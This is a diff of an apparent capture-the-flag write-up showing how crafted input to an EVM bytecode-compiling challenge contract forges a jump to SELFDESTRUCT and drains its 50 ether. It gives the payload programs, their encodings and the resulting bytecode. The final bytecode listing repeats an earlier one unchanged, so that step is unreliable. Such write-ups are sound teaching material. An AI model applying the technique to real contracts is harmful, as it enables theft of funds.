@@ -90,9 +90,63 @@ Since the first option seems to make the `ff` opcode inaccessible, we will explo
     j += 2;
 ```
 
-So the output EVM bytecode created by the input `Aff00` is `805161ff00018152` (`JUMPDEST DUP1 MLOAD PUSH2 ff00 ADD DUP2 MSTORE`). So, we need a push that escapes the 3 opcodes before `ff` (`805161`), and the 2 invalid EVM opcodes that follow the invalid input opcode (`beef`). Thus, we need a `PUSH5` (`64`).
+So the output EVM bytecode created by the input `Aff00` is `805161ff00018152` (`JUMPDEST DUP1 MLOAD PUSH2 ff00 ADD DUP2 MSTORE`). So, we need a `PUSHN` that escapes the 3 opcodes before `ff` (`805161`), and the 2 invalid EVM opcodes that follow the invalid input opcode (`beef`). Thus, we need a `PUSH5` (`64`).
 
-Now, if in the input program contains `64Aff00` (encoded `6441ff00`), it will create in the output EVM bytecode `dead64beef805161ff00018152` (`INVALID INVALID PUSH5 0xbeef805161 SELFDESTRUCT RETURN ADD DUP2 MSTORE`).
+Then, if in the input program contains `64Aff00` (encoded `6441ff00`), it will create in the output EVM bytecode `dead64beef805161ff00018152` (`INVALID INVALID PUSH5 0xbeef805161 SELFDESTRUCT RETURN ADD DUP2 MSTORE`).
 
 Knowing that we can make the compiler add jumps with the destination of our choice, as [explained above](#5-not-all-the-storage-variables-are-cleaned-after-an-execution), we now have to make a jump to the opcode `SELFDESTRUCT`. But we can jump only to a `JUMPDEST`. That is not a problem, because after the pseudo-opcode `A`, we can put the two bytes of our choice (we previously put `ff00`, but the `00` is arbitrary). So, we can replace `ff00` by `5bff` (`JUMPDEST SELFDESTRUCT`). Our input program will contain `64A5bff` (encoded `64415bff`). Il will produce the EVM bytecode `dead64beef8051615bff018152` (`INVALID INVALID PUSH5 0xbeef805161 JUMPDEST SELFDESTRUCT ADD DUP2 MSTORE`). We now have to create a false jump that will jump on the opcode `JUMPDEST`.
 
+If we want to make a jump to the destination of our choice, we need to make two transactions: one that will modify the mappings `loops` and `basicBlockAddrs`, and one that will use it to deploy the contract that will `selfdestruct`. The idea is that the first input program will have only a loop, and the second input program will contain an unmatched square bracket such that it will jump to a line defined by the first transaction. The second input program will also contain `64A5bff`, as explained above, and the objective is to jump on the `JUMPDEST`.
+
+We will take for the first input program the following:
+```
+##########################[##]
+```
+
+That gives when it is encoded:
+```
+23232323232323232323232323232323232323232323232323235b23235d
+```
+
+The deployed bytecode is:
+```
+0x60006180005b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b8051630000002f576300000038565b5b5b6300000020565b00
+```
+
+We let some space at the begining to let us a margin for some adjustements in the second input program. This program does almost nothing, but compiles and runs finely. But after the first execution, some mappings are affected. In particular, we have:
+
+```solidity
+loops[26] = 29 // `[` is matched to `]`
+basicBlockAddrs[30] = 56 // dst2 of the loop is the destination after the loop, here almost the end of the bytecode
+```
+
+Then, we need to put an unmatched square bracket in the second input program. If `i` is the index of the square bracket in the input program, we need that `basicBlockAddrs[loop[i] + 1]` is not null. Because the square bracket is unmatched, `loop[29]` is not redefined, and if there is no block in the second execution that begins at 30, `basicBlockAddrs[30]` is not redefined aswell. Then we can take `i = 29`. Like that, if the loop condition is not met, the jump will point to the index 56. Because we also need to include the code `64A5bff`, our second input program will look like that:
+
+```
+#####[64A5bff]]##############[###
+```
+
+Note that the last `[` opcode is at the same index as the same opcode in the first input program. We put our code `64A5bff` in a loop in order to escape this sequence: if we do not affect the memory, we will never enter in a loop. We took care of closing all the opened square bracket except the last one. Note that we had to add another `]` because as explained [here](#1-pseudo-opcodes-dont-escape-the-following-characters), the byte `5b` will be considered as the begining of a loop even if it is after the pseudo-opcode `A`. If we try to compile this input program, we obtain the following EVM bytecode:
+
+```
+0x60006180005b5b5b5b5b5b5b8051630000001a57630000004a565bdead64beef8051615bff0181525b80516300000037576300000043565bdeadffbeef6300000028565b630000000b565b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80516300000068576300000038565b5b5b5b5b5b5b5b00
+```
+
+We see that the opcode on which we would like to jump (a `5b` before a `ff`) is at the index 35. But we want it to be at the index 56, because it is where our modified jump goes. We can replace some `#` opcodes at the begining by others opcodes in order to add more bytecode at the begining, and to shift the index of out `JUMPDEST` to the right. The only restriction on the input opcodes to use is that we can't use those that affect the memory (because we need it to be untouched to avoid entering the loops). With some tries or computations, we find that the following input program puts the `JUMPDEST` at the index 56 and works fine:
+
+```
+,-<##[64A5bff]]##############[###
+```
+
+And the encoded version is:
+
+```
+2c2d3c23235b64415bff5d5d23232323232323232323232323235b232323232323
+```
+
+And it deploys the bytecode:
+```
+0x60006180005b5b5b5b5b5b5b8051630000001a57630000004a565bdead64beef8051615bff0181525b80516300000037576300000043565bdeadffbeef6300000028565b630000000b565b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80516300000068576300000038565b5b5b5b5b5b5b5b00
+```
+
+By executing the two transactions in a row, the contract will selfdestruct and send all of his money, the 50 ethers, to some address. We can deploy [`Solution.sol`](Solution.sol) that solves the challenge at the deployment.
